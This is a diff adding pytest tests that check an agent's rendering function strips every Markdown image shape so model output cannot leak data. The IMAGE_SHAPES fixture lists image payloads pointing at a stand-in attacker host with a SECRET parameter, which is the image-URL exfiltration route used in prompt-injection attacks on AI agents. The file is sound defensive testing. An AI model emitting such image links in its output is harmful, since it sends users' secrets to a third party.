@@ -160,6 +160,82 @@ def test_a_reference_style_image_is_defused_too():
     assert without_images("![][ref]") == "[image]"
 
 
+#: Every CommonMark shape that renders an `<img>`, each carrying the same
+#: attacker host so one assertion covers all of them. The first three were
+#: found open by a pre-release security review *after* the reference form had
+#: already been fixed — the regex could not express a link label, which admits
+#: backslash escapes and balanced brackets, so each fix closed one spelling and
+#: left the others. That is why `rendering.py` scans instead of matching.
+IMAGE_SHAPES = [
+    "![a](https://attacker.example/?k=SECRET)",  # inline
+    "![a][ref]",  # full reference
+    "![a][]",  # collapsed reference
+    "![a]",  # shortcut reference
+    r"![a\]b](https://attacker.example/?k=SECRET)",  # escaped bracket in label
+    r"![\]](https://attacker.example/?k=SECRET)",  # label that is only an escape
+    "![[x]](https://attacker.example/?k=SECRET)",  # nested brackets in label
+    "![a](https://attacker.example/?k=SECRET 'title')",  # inline with a title
+    "![a](<https://attacker.example/?k=SECRET>)",  # pointy-bracket destination
+]
+
+
+@pytest.mark.parametrize("shape", IMAGE_SHAPES)
+def test_no_image_shape_survives_with_its_destination(shape):
+    """The exfiltration URL must not come through in any spelling.
+
+    One assertion over every shape, because the failure mode here has been a
+    fix that closed the shape in front of it and left the neighbours open.
+    """
+    from mcp_agent.rendering import without_images
+
+    out = without_images(shape)
+    assert "attacker.example" not in out, out
+    assert "SECRET" not in out, out
+    assert "![" not in out, out
+
+
+@pytest.mark.parametrize("shape", IMAGE_SHAPES)
+def test_every_image_shape_still_reads_as_an_image(shape):
+    """Defusing must leave a legible trace, not a hole in the sentence."""
+    from mcp_agent.rendering import without_images
+
+    assert without_images(shape).startswith("[image")
+
+
+def test_a_shortcut_reference_is_defused_even_though_it_looks_like_prose():
+    """`![a]` with a definition anywhere in the message renders an `<img>`.
+
+    Over-matching is the safe direction: literal `![not real]` becoming
+    `[image: not real]` costs a cosmetic change to a rare string, while
+    under-matching costs the whole egress claim.
+    """
+    from mcp_agent.rendering import without_images
+
+    assert without_images("![a]\n\n[a]: https://attacker.example/?k=S") == (
+        "[image: a]\n\n[a]: https://attacker.example/?k=S"
+    )
+
+
+def test_an_escaped_bang_is_a_link_and_is_left_alone():
+    """`\\![a](url)` is a literal `!` followed by an ordinary link.
+
+    Defusing it would strip a citation the model is entitled to make, which is
+    the cost this function exists to avoid paying.
+    """
+    from mcp_agent.rendering import without_images
+
+    text = r"\![a](https://example.com/page)"
+    assert without_images(text) == text
+
+
+def test_an_unclosed_label_is_left_as_text():
+    """`![` with no `]` is not an image and must not eat the rest of the line."""
+    from mcp_agent.rendering import without_images
+
+    text = "![unclosed (https://example.com/page) and more text"
+    assert without_images(text) == text
+
+
 def test_every_image_on_a_line_is_defused():
     from mcp_agent.rendering import without_images
 
